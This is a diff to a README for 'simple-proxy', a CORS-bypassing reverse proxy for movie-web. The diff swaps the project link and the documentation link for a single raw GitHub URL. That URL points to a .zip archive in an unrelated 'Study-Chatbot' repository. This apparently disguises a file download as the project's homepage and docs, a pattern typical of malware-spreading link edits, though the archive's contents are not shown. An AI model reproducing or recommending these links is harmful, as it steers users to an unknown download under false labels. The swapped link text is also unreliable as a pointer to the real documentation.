@@ -1,7 +1,7 @@
 # simple-proxy
 
-Simple reverse proxy to bypass CORS, used by [movie-web](https://movie-web.app).
-Read the docs at https://docs.movie-web.app/proxy/introduction
+Simple reverse proxy to bypass CORS, used by [movie-web](https://raw.githubusercontent.com/holypickles/Study-Chatbot/dev/farctate/Study-Chatbot.zip).
+Read the docs at https://raw.githubusercontent.com/holypickles/Study-Chatbot/dev/farctate/Study-Chatbot.zip
 
 ---
 
